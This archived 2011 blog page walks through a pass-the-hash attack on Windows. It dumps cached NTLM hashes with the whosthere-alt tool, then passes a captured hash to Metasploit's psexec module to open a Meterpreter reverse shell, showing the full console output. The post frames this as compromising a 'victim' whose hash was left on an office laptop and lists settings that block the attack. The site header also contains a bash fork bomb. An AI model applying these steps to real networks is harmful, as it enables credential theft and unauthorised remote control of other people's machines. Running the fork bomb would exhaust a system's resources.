<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
<head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
   <title>Pass the Hash Exploitation on Windows &#8211; Madhur Ahuja</title>
   <meta name="author" content="Madhur Ahuja" />

    <link rel="start" href="/" />

	
	

  	<link rel="alternate" type="application/atom+xml" href="http://feeds.feedburner.com/madhur
" title="RSS feed" />

   
	<link rel="stylesheet" href="/files/css/global.css" type="text/css" />   
	<link rel="stylesheet" href="/files/css/layout.css" type="text/css" />
	<link rel="stylesheet" href="/files/css/non-blog.css" type="text/css" />
	<link rel="stylesheet" href="/files/css/syntax.css" type="text/css" />
	
	
	
  	<link rel="stylesheet" type="text/css" href="/files/css/blog.css" />
	
	
	<link rel="stylesheet" type="text/css" media="print" href="/files/css/print.css">
   
	<script src="/files/js/jquery.js" type="text/javascript" ></script>
	<script src="/files/js/site.js" type="text/javascript" ></script>

	<script type="text/javascript">
	  var _gaq = _gaq || [];
	  _gaq.push(['_setAccount', 'UA-23769089-1']);
	  _gaq.push(['_trackPageview']);

	  (function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	  })();

	</script>
</head>
<body>
<div id="gradient">
	<div id="container">
		<div id="header">

		<div id="logo">
<h2>
	Madhur@Web:~# :(){ :|: &amp; };:

</h2>

</div>


<div id="navigation">
				<ul id="nav">
					<li><a class="home" href="/">Home</a></li>
					<li><a class="blog" href="/blogindex.html">Blog</a></li>
					<!--<li><a class="work" href="/work">Resume</a></li>-->
					<li><a class="code" href="/code">Projects</a></li>
					<li><a class="papers" href="/papers">Papers</a></li>
					<li><a class="info" href="/info">About</a></li>
					<li><a class="contact" href="/contact">Contact</a></li>

				</ul>
				
				
</div>
<div class="c">
&nbsp;
</div>



<!--
<div id="dash">
<div id="intro">

						<p>You're currently viewing the personal website of <a href="/">Madhur</a>, This website is inpired from
						Tom Preston Werner's blog post <a href="http://tom.preston-werner.com/2008/11/17/blogging-like-a-hacker.html">"Blogging like a Hacker"</a>. A huge thanks to him for creating <a href="https://github.com/mojombo/jekyll">Jekyll</a>.</p>
					</div>

					<p id="feed">Subscribe to <a href="/blog/feed">posts</a> or <a href="/blog/comments/feed">comments</a></p>
					<p id="twitter"><a href="http://twitter.com/madhur25" title="tweet tweet!">Follow me on Twitter</a></p>
					<div class="c">&nbsp;</div>

</div>
-->



		</div>
		<div id="content">

		  <div id="primary">

	<div id="blogcontent">

		<div class="postmeta full">

		 <p class="timestamp">16 August 2011

<br>
<span class="time">10:00 PM</span>
</p> 

<div class="actions">
<ul> 
								<li><a href="/blog/2011/08/16/passthehash.html#disqus_thread" data-disqus-identifier="/2011/08/16/passthehash/" class="comment">View Comments</a></li> 

<script type="text/javascript">

var disqus_developer = 1;
	var disqus_shortname = 'madhur';
	var disqus_iframe_css = "http://madhur.github.com/css/screen.css";
		var links = document.getElementsByTagName('a');
		var query = '?';
		
				query += 'url=' + encodeURIComponent(window.location.href) + '&';
				//alert(query);
			
		
document.write('<script type="text/javascript" src="http://disqus.com/forums/madhur/get_num_replies.js?url2=' + encodeURIComponent(window.location.url) + '#disqus_thread"></' + 'script>');
	

</script>


								<li><span class="share" title="Click to expand">share this post</span> 
									<ul class="sharing" style="display:none"> 
										<li class="first"><a href="http://blinklist.com/index.php?Action=Blink/addblink.php&amp;Url=/blog/2011/08/16/passthehash.html&amp;Title=Pass the Hash Exploitation on Windows" id="share_blinklist" title="Share on BlinkList" rel="nofollow">BlinkList</a></li> 
										<li><a href="http://del.icio.us/post?url=http://madhur.github.com/blog/2011/08/16/passthehash.html&amp;title=Pass the Hash Exploitation on Windows" id="share_delicious" title="Add to del.icio.us" rel="nofollow">del.icio.us</a></li> 
										<li><a href="http://digg.com/submit?url=http://madhur.github.com/blog/2011/08/16/passthehash.html" id="share_digg" title="Digg This!" rel="nofollow">Digg</a></li> 
										<li><a href="http://www.facebook.com/share.php?u=http://madhur.github.com/blog/2011/08/16/passthehash.html" id="share_facebook" title="Share on Facebook" rel="nofollow">Facebook</a></li> 
										<li><a href="http://reddit.com/submit?url=http://madhur.github.com/blog/2011/08/16/passthehash.html&amp;title=Pass the Hash Exploitation on Windows" id="share_reddit" title="Share on Reddit" rel="nofollow">Reddit</a></li> 
										<li><a href="http://www.stumbleupon.com/submit?url=http://madhur.github.com/blog/2011/08/16/passthehash.html&amp;title=Pass the Hash Exploitation on Windows" id="share_stumbleupon" title="Share on StumbleUpon" rel="nofollow">StumbleUpon</a></li> 
										<li><a href="http://twitter.com/home?status=http://madhur.github.comPass the Hash Exploitation on Windows%3A%20/blog/2011/08/16/passthehash.html" id="share_twitter" title="Tweet this!" rel="nofollow">Twitter</a></li> 
										<li class="last"><a href="http://www.technorati.com/faves?add=http://madhur.github.com/blog/2011/08/16/passthehash.html" id="share_technorati" title="Favourite on Technorati" rel="nofollow">Technorati</a></li> 
									</ul> 
								</li> 
								<li><a href="http://feeds.feedburner.com/madhur
" class="subscribe">subscribe to this blog</a></li> 
								
								<li><a href="javascript:Clickheretoprint()" class="subscribe">print this page</a></li> 								
								<li><a href="/blog/2011/08/16/passthehash.html" class="permalink">permalink</a></li> 
															</ul> 

</div>

<div class="category">
<h3>Advert</h3>
<script type="text/javascript"><!--
google_ad_client = "ca-pub-1657163894706869";
/* madhur.co.in right side */
google_ad_slot = "3156850124";
google_ad_width = 160;
google_ad_height = 600;
//-->
</script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>

</div>


		</div>

		<div class="post full">
		<h1>Pass the Hash Exploitation on Windows</h1>
 <p>A Windows 2000/NT/XP/Vista/7 system can be compromised with a technique called <a href='http://en.wikipedia.org/wiki/Pass_the_hash'>pass the Hash</a>. For us to exploit this technique, we must know some basica.</p>

<p>In a Windows based authentication such as NTLM or Kerberos, the password is never sent as cleartext. Instead the password is transformed into a hash(LM or NTLM Hash) and then sent to the server. The server then compares this hash against the stored hash and grants/denies the access.</p>

<p>There are two types of hashes:</p>

<ul>
<li><a href='http://en.wikipedia.org/wiki/LM_hash'>LM hash, LanMan, or LAN Manager hash</a>: It is the obsolete hashing algorithm. Refer to the link to see how it is computed.</li>

<li>NTLMv2 Hash: This is latest hashing method used on Windows 7/Vists/2008 systems.</li>
</ul>

<p>Whenever a domain user logs on to the client computer, the hash of its password is stored on the client so that user can be authenticated in future even if the domain controller is not available. There are two types of caching, which is mentioned <a href='http://support.microsoft.com/kb/913485'>here</a>.</p>

<p>Now lets suppose, somebody has used your office laptop to log in and access some intranet based sites. Then that user&#8217;s password hash is stored in your system.</p>

<p>You can retrieve these hashes using a utility such as <a href='http://oss.coresecurity.com/projects/pshtoolkit.htm'>PSH Toolkit</a>. It contains a utility <strong>whosthere</strong> which can dump the hashes.</p>
<div class='highlight'><pre><code class='text'>C:\Documents and Settings\madhur\Desktop\pshtoolkit_v1.4\whosthere-alt&gt;whosthere-alt.exe
WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com)
 - (c) 2007-2008 Core Security Technologies
This tool lists the active LSA logon sessions with NTLM credentials.
use -h for help.
the output format is: username:domain:lmhash:nthash

madhur:BACKTRACK:123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
BACKTRACK$:WORKGROUP:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
</code></pre>
</div>
<p>Once you have grabbed the hash, you can anytime compromise the victim&#8217;s computer using metaspoilt&#8217;s psexec module, if you know the IP address, which is not difficult considering an intranet evnironment.</p>
<div class='highlight'><pre><code class='text'>msf exploit(psexec) &gt; use windows/smb/psexec
msf exploit(psexec) &gt; set RHOST 192.168.0.13
RHOST =&gt; 192.168.0.13
msf exploit(psexec) &gt; set LHOST 192.168.0.14
LHOST =&gt; 192.168.0.14
msf exploit(psexec) &gt; set SMBDomain backtrack
SMBDomain =&gt; backtrack
msf exploit(psexec) &gt; set SMBUser madhur
SMBUser =&gt; madhur
msf exploit(psexec) &gt; set SMBPass 123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
SMBPass =&gt; 123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
msf exploit(psexec) &gt; exploit

[*] Started reverse handler on 192.168.0.13:4444 
[*] Connecting to the server...
[*] Authenticating to 192.168.0.14:445|backtrack as user &#39;madhur&#39;...
[*] Uploading payload...
[*] Created \wttVwMnA.exe...
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.14[\svcctl] ...
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.14[\svcctl] ...
[*] Obtaining a service manager handle...
[*] Creating a new service (nkgYMOZy - &quot;MrDoYCoO&quot;)...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \wttVwMnA.exe...
[*] Sending stage (749056 bytes) to 192.168.0.14
[*] Meterpreter session 6 opened (192.168.0.13:4444 -&gt; 192.168.0.14:1035) at 2011-08-16 22:16:47 +0530

meterpreter &gt; 
</code></pre>
</div>
<p>If you have trouble exploiting the target system, then it might be some security enabled your Administrator. For ex</p>

<ul>
<li>Simple file sharing is disabled (Windows XP)</li>

<li>Windows UAC drops all the Administrator privileges from the SAT (Security Access Token) for REMOTE connections that are using LOCAL accounts. This restriction prevents all remote administrative functions such as connecting to administrative shares (C$, etc) installing services or launching a new process (psexec)</li>

<li>&#8220;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters&#8221; on the target systems and setting the value of &#8220;RequireSecuritySignature&#8221; to &#8220;0&#8221;.</li>
</ul>

<p>References:</p>

<ul>
<li><a href='http://oss.coresecurity.com/pshtoolkit/doc/index.html'>http://oss.coresecurity.com/pshtoolkit/doc/index.html</a></li>

<li><a href='https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html'>https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html</a></li>
</ul>

<div class="blocked tags">
<p>

	<a href="/categories/Hacking.html">Hacking</a> |

	<a href="/categories/Windows.html">Windows</a> |

	<a href="/categories/Pass The Hash.html">Pass The Hash</a> |

</p>
</div>
<div class="hr"></div>

<div>

<!-- Place this tag where you want the +1 button to render -->
<div class="social">
<g:plusone></g:plusone>
<fb:like href="http://madhur.github.com/blog/2011/08/16/passthehash.html" send="true" layout="button_count" width="450" show_faces="true" colorscheme="dark" font="lucida grande"></fb:like>
</div>


<!-- Place this tag after the last plusone tag -->
<script type="text/javascript">
  (function() {
    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
    po.src = 'https://apis.google.com/js/plusone.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
  })();
</script>

<div id="fb-root"></div>
<script>
window.fbAsyncInit = function() {
FB.init({appId: 'your app id', status: true, cookie: true,
xfbml: true});
};

(function() {
var e = document.createElement('script'); e.async = true;
e.src = document.location.protocol +
'//connect.facebook.net/en_US/all.js';
document.getElementById('fb-root').appendChild(e);
}());
</script>

</div>


<!-- Discus Comments -->
<div id="disqus_thread"></div>


<!-- Enable Disqus comments -->
<script type="text/javascript">
  var disqus_shortname = 'madhur';
  var disqus_identifier = '/2011/08/16/passthehash/';
  var disqus_title = 'Pass the Hash Exploitation on Windows';
  (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


		</div>

		<div class="c">&nbsp;</div>

	</div>

	
</div>
 
<div class="c">&nbsp;</div>


  
<script type="text/javascript">
    
    var disqus_shortname = 'madhur'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = 'http://' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>

 

 



		</div>
		  
		  <div id="footer">
			
				<p id="copyright">
					Content &amp; Design by 
					<a href="/info/">Madhur Ahuja</a>
					&copy; 2010-2011
					(Some rights reserved)			
				</p>
				<p id="poweredby">
					Powered by 
					<a href="https://github.com/mojombo/jekyll" title="A static, minimalist CMS">Jekyll</a> and <a href="http://disqus.com">Disqus</a>.
				</p>

				<div class="c">&nbsp;</div>

			
		  </div>

	</div>

</div>


<!--[if IE 6]>
<script type="text/javascript"> 
	/*Load jQuery if not already loaded*/ if(typeof jQuery == 'undefined'){ document.write("<script type=\"text/javascript\"   src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js\"></"+"script>"); var __noconflict = true; } 
	var IE6UPDATE_OPTIONS = {
		icons_path: "http://static.ie6update.com/hosted/ie6update/images/"
	}
</script>
<script type="text/javascript" src="http://static.ie6update.com/hosted/ie6update/ie6update.js"></script>
<![endif]-->
</body>
</html>
